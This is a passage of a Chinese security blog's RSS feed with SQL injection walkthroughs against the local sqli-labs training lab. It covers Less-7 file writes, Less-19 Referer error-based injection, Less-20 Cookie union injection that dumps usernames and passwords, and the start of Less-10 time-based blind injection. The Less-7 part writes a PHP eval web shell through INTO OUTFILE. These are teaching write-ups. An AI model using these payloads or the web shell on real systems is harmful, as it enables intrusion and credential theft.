&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) order by 3 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;不报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) order by 4 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax，报错，所以只有三列&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用&lt;code&gt;into outflie&lt;/code&gt;语句&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) union select 1,2,3 into outfile &amp;quot;C:\\phpStudyB\\WWW\\sqli\\Less-7\\aaa.txt&amp;quot; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002011103261.png&#34; alt=&#34;image-20221002011103261&#34;&gt;&lt;/p&gt;
&lt;p&gt;虽然报错，但是我们尝试去看一下&lt;code&gt;Less-7/aaa.txt&lt;/code&gt;有没有生成&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002011152149.png&#34; alt=&#34;image-20221002011152149&#34;&gt;&lt;/p&gt;
&lt;p&gt;写入成功。那么，既然可以写入文件，那就可以写入一句话木马。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) union select 1,2,&amp;quot;&amp;lt;?php @eval ($_POST[value]);?&amp;gt;&amp;quot; into outfile &amp;quot;C:\\phpStudyB\\WWW\\sqli\\Less-7\\aaa.php&amp;quot; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;并成功解析成php执行。&lt;/p&gt;
&lt;p&gt;至此，SQL注入文件读写演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/HTTP-Referer%E6%B3%A8%E5%85%A5/</guid>
            <title>HTTP-Referer注入</title>
            <link>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/HTTP-Referer%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Sat, 01 Oct 2022 23:10:40 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL注入之HTTP-Referer注入&#34;&gt;&lt;a href=&#34;#SQL注入之HTTP-Referer注入&#34; class=&#34;headerlink&#34; title=&#34;SQL注入之HTTP-Referer注入&#34;&gt;&lt;/a&gt;SQL注入之HTTP-Referer注入&lt;/h1&gt;&lt;p&gt;本篇讲解HTTP-Referer注入&lt;/p&gt;
&lt;p&gt;:::info&lt;/p&gt;
&lt;p&gt;HTTP-Referer注入&lt;/p&gt;
&lt;p&gt;:::&lt;/p&gt;
&lt;p&gt;在前几章的博客中，满篇都是对于基于select的注入手段。&lt;/p&gt;
&lt;p&gt;其实，对于数据库而言，像update、insert等命令都有可爆出数据库信息的点的。&lt;/p&gt;
&lt;p&gt;OK，开始做Less-19，送入&lt;strong&gt;Repeater&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&#34;尝试报错&#34;&gt;&lt;a href=&#34;#尝试报错&#34; class=&#34;headerlink&#34; title=&#34;尝试报错&#34;&gt;&lt;/a&gt;尝试报错&lt;/h2&gt;&lt;p&gt;在Referer后添加一个单引号：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;结果报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001235013114.png&#34; alt=&#34;image-20221001235013114&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;尝试不报错&#34;&gt;&lt;a href=&#34;#尝试不报错&#34; class=&#34;headerlink&#34; title=&#34;尝试不报错&#34;&gt;&lt;/a&gt;尝试不报错&lt;/h2&gt;&lt;p&gt;我们尝试通过加 双引号”、 #号及其变形（#、%23、—+）来看看能否不报错&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot;&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;&amp;quot; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot; %23&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot; --+&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后面还有个小括号，试试看是否需要闭合&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;&amp;quot;) --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot;) --+&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;)&amp;quot; --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot; --+&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;依旧不行，我们回过头来看看第一个报错&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;near &amp;#39;&amp;quot;&amp;#39;, &amp;#39;127.0.0.1&amp;#39;)&amp;#39; at line 1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;去掉最外层的两个单引号：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;quot;&amp;#39;, &amp;#39;127.0.0.1&amp;#39;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;一个数据库语句出现了逗号，说明极有可能是union引导的&lt;code&gt;select 1,2&lt;/code&gt;这样的查询，或者是&lt;strong&gt;insert、update&lt;/strong&gt;这样的语句：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;insert into 表名 values(a,b,c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;例子：insert into student_info values(5,&amp;#x27;liutao&amp;#x27;,&amp;#x27;12&amp;#x27;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UPDATE student_info SET num=4,name=&amp;#x27;liutao&amp;#x27;,age=&amp;#x27;15&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为除了逗号之外还出现了括号，&lt;strong&gt;update和select一般是没有括号的&lt;/strong&gt;，因此锁定在&lt;strong&gt;insert into&lt;/strong&gt;上。&lt;/p&gt;
&lt;p&gt;那么，我们目前注入的位置是很大概率在&lt;code&gt;&amp;#39;liutao&amp;#39;, &amp;#39;12&amp;#39;&lt;/code&gt;这个逗号所在位置附近。&lt;/p&gt;
&lt;p&gt;因此，&lt;strong&gt;由于注入内容后面跟着一个单引号&lt;/strong&gt;，我们尝试&lt;code&gt;and&lt;/code&gt;结合&lt;code&gt;单引号&lt;/code&gt;注入：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;insert into student_info values(5,&amp;#x27;liutao&amp;#x27; and &amp;#x27;&amp;#x27;,&amp;#x27;12&amp;#x27;); &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;OK，替换成我们的语句就是：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功不报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002000657623.png&#34; alt=&#34;image-20221002000657623&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;优先尝试报错注入&#34;&gt;&lt;a href=&#34;#优先尝试报错注入&#34; class=&#34;headerlink&#34; title=&#34;优先尝试报错注入&#34;&gt;&lt;/a&gt;优先尝试报错注入&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;由于是使用and+单引号注入&lt;/strong&gt;，可插入非法查询语句的位置和平常不太一样，因此我们尝试再加入&lt;code&gt;一个and来构造一个报错条件&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and extractvalue(1,concat(0x7e,version(),0x7e)) and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002001021204.png&#34; alt=&#34;image-20221002001021204&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;爆数据库名&#34;&gt;&lt;a href=&#34;#爆数据库名&#34; class=&#34;headerlink&#34; title=&#34;爆数据库名&#34;&gt;&lt;/a&gt;爆数据库名&lt;/h2&gt;&lt;p&gt;接下来就是替换version()了。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002001434314.png&#34; alt=&#34;image-20221002001434314&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;爆表名&#34;&gt;&lt;a href=&#34;#爆表名&#34; class=&#34;headerlink&#34; title=&#34;爆表名&#34;&gt;&lt;/a&gt;爆表名&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002001605648.png&#34; alt=&#34;image-20221002001605648&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;爆列名&#34;&gt;&lt;a href=&#34;#爆列名&#34; class=&#34;headerlink&#34; title=&#34;爆列名&#34;&gt;&lt;/a&gt;爆列名&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#x27;users&amp;#x27;),0x7e)) and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002001714543.png&#34; alt=&#34;image-20221002001714543&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，HTTP-Referer注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/Cookie%E6%B3%A8%E5%85%A5/</guid>
            <title>Cookie注入</title>
            <link>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/Cookie%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Sat, 01 Oct 2022 22:13:13 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL注入之Cookie注入&#34;&gt;&lt;a href=&#34;#SQL注入之Cookie注入&#34; class=&#34;headerlink&#34; title=&#34;SQL注入之Cookie注入&#34;&gt;&lt;/a&gt;SQL注入之Cookie注入&lt;/h1&gt;&lt;p&gt;本篇讲解Cookie注入。&lt;/p&gt;
&lt;p&gt;老样子，Less-20，直接送入repeater&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001224019603.png&#34; alt=&#34;image-20221001224019603&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;尝试报错&#34;&gt;&lt;a href=&#34;#尝试报错&#34; class=&#34;headerlink&#34; title=&#34;尝试报错&#34;&gt;&lt;/a&gt;尝试报错&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001224212276.png&#34; alt=&#34;image-20221001224212276&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;尝试不报错&#34;&gt;&lt;a href=&#34;#尝试不报错&#34; class=&#34;headerlink&#34; title=&#34;尝试不报错&#34;&gt;&lt;/a&gt;尝试不报错&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001224125843.png&#34; alt=&#34;image-20221001224125843&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;尝试order-by-注入&#34;&gt;&lt;a href=&#34;#尝试order-by-注入&#34; class=&#34;headerlink&#34; title=&#34;尝试order by 注入&#34;&gt;&lt;/a&gt;尝试order by 注入&lt;/h2&gt;&lt;p&gt;order by n asc/desc是指定列号n进行排序&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27; order by 4 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错：YOUR COOKIE : uname = admin&amp;#x27; order by 4 # and expires&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27; order by 3 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;成功不报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因此确定&lt;code&gt;列数为3&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：在order by后面的不会根据计算的结果来排序，所以可以直接用来报错注入。&lt;/p&gt;
&lt;p&gt;尝试下直接报错注入是否可行：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27; order by extractvalue(1,concat(0x7e,version(),0x7e))%23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错：YOUR COOKIE : uname = admin&amp;#x27; order by extractvalue(1,concat(0x7e,version(),0x7e))#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;报错，看来这种直接报错注入的方式是不可行的。&lt;/p&gt;
&lt;h2 id=&#34;Cookie注入查询到数据库名&#34;&gt;&lt;a href=&#34;#Cookie注入查询到数据库名&#34; class=&#34;headerlink&#34; title=&#34;Cookie注入查询到数据库名&#34;&gt;&lt;/a&gt;Cookie注入查询到数据库名&lt;/h2&gt;&lt;p&gt;cookie注入就是基于union查询的基础上，在Cookie中进行注入&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27; and 0 union select 1, database(), 3 %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001225129636.png&#34; alt=&#34;image-20221001225129636&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;查询到表名&#34;&gt;&lt;a href=&#34;#查询到表名&#34; class=&#34;headerlink&#34; title=&#34;查询到表名&#34;&gt;&lt;/a&gt;查询到表名&lt;/h2&gt;&lt;p&gt;进而通过替换database()处，变成&lt;code&gt;双注入&lt;/code&gt;，再查询出表名&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27; and 0 union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 3 %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001225840363.png&#34; alt=&#34;image-20221001225840363&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;查询到列名&#34;&gt;&lt;a href=&#34;#查询到列名&#34; class=&#34;headerlink&#34; title=&#34;查询到列名&#34;&gt;&lt;/a&gt;查询到列名&lt;/h2&gt;&lt;p&gt;一样的套路&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27; and 0 union select 1, (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#x27;users&amp;#x27;), 3 %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001230122246.png&#34; alt=&#34;image-20221001230122246&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;查询到账号密码&#34;&gt;&lt;a href=&#34;#查询到账号密码&#34; class=&#34;headerlink&#34; title=&#34;查询到账号密码&#34;&gt;&lt;/a&gt;查询到账号密码&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27; and 0 union select 1, (select group_concat(concat_ws(0x7e,username,password)) from security.users), 3 %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001230318424.png&#34; alt=&#34;image-20221001230318424&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;思考&#34;&gt;&lt;a href=&#34;#思考&#34; class=&#34;headerlink&#34; title=&#34;思考&#34;&gt;&lt;/a&gt;思考&lt;/h2&gt;&lt;p&gt;通过Cookie注入，我们要思考：&lt;code&gt;HTTP请求包中，是否还有其他的字段（Cookie外）也有可能和数据库产生交互呢？&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;答：有的，&lt;code&gt;HTTP-Referer&lt;/code&gt;就存在。&lt;/p&gt;
&lt;p&gt;至此，Cookie注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</guid>
            <title>时间盲注</title>
            <link>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</link>
            <category>SQL注入探究</category>
            <pubDate>Sat, 01 Oct 2022 20:10:06 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL注入之时间盲注&#34;&gt;&lt;a href=&#34;#SQL注入之时间盲注&#34; class=&#34;headerlink&#34; title=&#34;SQL注入之时间盲注&#34;&gt;&lt;/a&gt;SQL注入之时间盲注&lt;/h1&gt;&lt;p&gt;在上一篇博客中，了解了&lt;strong&gt;布尔盲注&lt;/strong&gt;，其实&lt;strong&gt;布尔盲注&lt;/strong&gt;和&lt;strong&gt;时间盲注&lt;/strong&gt;大致相同，注入原理是一致的，区别就是一个&lt;strong&gt;还是有回显的&lt;/strong&gt;，一个&lt;strong&gt;彻底没有回显&lt;/strong&gt;，通过构造语句，通过页面响应的时长，来判断信息，这就是时间盲注。&lt;/p&gt;
&lt;p&gt;先来学习一下&lt;strong&gt;时间盲注&lt;/strong&gt;所需要的函数&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sleep()//延迟函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(condition,true,false)//若条件为真 返回true，若条件为假 返回false&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;substring(&amp;quot;string&amp;quot;,strart,length)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;主要的也就是这几个了，下面就通过&lt;strong&gt;sqli-labs&lt;/strong&gt;第十关来练习时间盲注&lt;/p&gt;
&lt;h2 id=&#34;尝试注入报错&#34;&gt;&lt;a href=&#34;#尝试注入报错&#34; class=&#34;headerlink&#34; title=&#34;尝试注入报错&#34;&gt;&lt;/a&gt;尝试注入报错&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-10/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001170904491.png&#34; alt=&#34;image-20221001170904491&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-10/?id=1&amp;#x27;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001170453268.png&#34; alt=&#34;image-20221001170453268&#34;&gt;&lt;/p&gt;
&lt;p&gt;构造&lt;code&gt;and 1&lt;/code&gt;条件，然后使用if条件语句包含时间盲注。&lt;/p&gt;
&lt;p&gt;如果database()的长度大于5，那么返回1，否则延迟10s&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;quot; and if(length(database())&amp;gt;5,1,sleep(10))--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001175533536.png&#34; alt=&#34;image-20221001175533536&#34;&gt;&lt;/p&gt;
&lt;p&gt;将长度改为和10进行比较&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-10/?id=1&amp;quot; and if(length(database())&amp;gt;10,1,sleep(10))--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;开始转圈等待10s了，所以存在时间盲注条件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001184209796.png&#34; alt=&#34;image-20221001184209796&#34;&gt;&lt;/p&gt;
&lt;p&gt;手工注入太浪费时间，开始研究脚本爆破&lt;/p&gt;
